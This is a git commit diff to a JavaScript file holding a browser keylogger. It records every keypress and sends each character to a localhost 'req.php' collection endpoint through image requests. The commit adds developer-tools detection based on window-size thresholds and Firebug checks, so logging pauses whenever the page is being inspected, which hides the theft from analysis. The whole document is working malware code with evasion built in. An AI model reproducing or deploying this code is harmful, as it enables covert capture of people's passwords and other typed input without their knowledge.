64aaa84032d8e3143ef8c341f9b71e3a73b3003c
otea <otea@sky.optymyze.com>
2018-02-21 12:17:06 +0200

    Checks if dev tool is opened

--- script.js
+++ script.js
@@ -1,1 +1,30 @@
-document.addEventListener('keypress', ({keyCode, charCode, which}) => new Image().src = `http://localhost/req.php?c=${encodeURIComponent(String.fromCharCode(keyCode || charCode || which))}`)
+const URL = 'http://localhost/skl/req.php?c=';
+
+const record = ({keyCode, charCode, which}) => new Image().src = `${URL}${encodeURIComponent(String.fromCharCode(keyCode || charCode || which))}`;
+window.addEventListener('devtoolschange', ({detail}) => detail.open ? document.removeEventListener('keypress', record) : document.addEventListener('keypress', record));
+
+(function () {
+	'use strict';
+	let devToolsOpened = false;
+	let threshold = 160;
+	const emitEvent = state => window.dispatchEvent(new CustomEvent('devtoolschange', {detail: {open: state}}));
+	
+	setInterval(() => {
+		let widthThreshold = window.outerWidth - window.innerWidth > threshold;
+		let heightThreshold = window.outerHeight - window.innerHeight > threshold;
+
+		if(!(heightThreshold && widthThreshold) && ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
+			!devToolsOpened && emitEvent(true);
+			devToolsOpened = true;
+		} else {
+			devToolsOpened && emitEvent(false);
+			devToolsOpened = false;
+		}
+	}, 500);
+
+	if(typeof module !== 'undefined' && module.exports) {
+		module.exports = devToolsOpened;
+	} else {
+		window.devToolsOpened = devToolsOpened;
+	}
+})();
